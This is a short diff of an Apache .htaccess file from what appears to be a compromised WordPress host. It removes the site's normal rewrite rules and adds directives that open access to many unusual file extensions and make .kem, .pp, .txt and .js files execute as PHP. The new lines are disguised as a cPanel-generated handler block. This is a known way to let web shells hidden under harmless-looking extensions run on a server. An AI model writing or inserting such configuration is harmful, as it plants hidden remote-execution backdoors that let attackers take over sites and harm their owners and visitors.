@@ -1,17 +1,10 @@
-# BEGIN WordPress
 
-RewriteEngine On
-RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]
-RewriteBase /
-RewriteRule ^index\.php$ - [L]
-RewriteCond %{REQUEST_FILENAME} !-f
-RewriteCond %{REQUEST_FILENAME} !-d
-RewriteRule . /index.php [L]
-
-# END WordPress
-<IfModule mod_security.c>
-SecFilterEngine Off
-SecFilterScanPOST Off
+<Files ~ '\.(xml|cgi|phtml|pphhttmmll|js|pp|txt|kem|css|jpe?g|png|gif|js|pdf|phtml|html|shtml|phar|pht|pp|kem|exe|php7|ph|php5|php)$'>
+Allow from all
+</Files>
+# php -- BEGIN cPanel-generated handler, do not edit
+# Set the “ea-php81” package as the default “PHP” programming language.
+<IfModule mime_module>
+  AddHandler application/x-httpd-ea-php81 .php .kem .pp .txt .js
 </IfModule>
-
-AddType 'text/html; charset=UTF-8' .html
+# php -- END cPanel-generated handler, do not edit
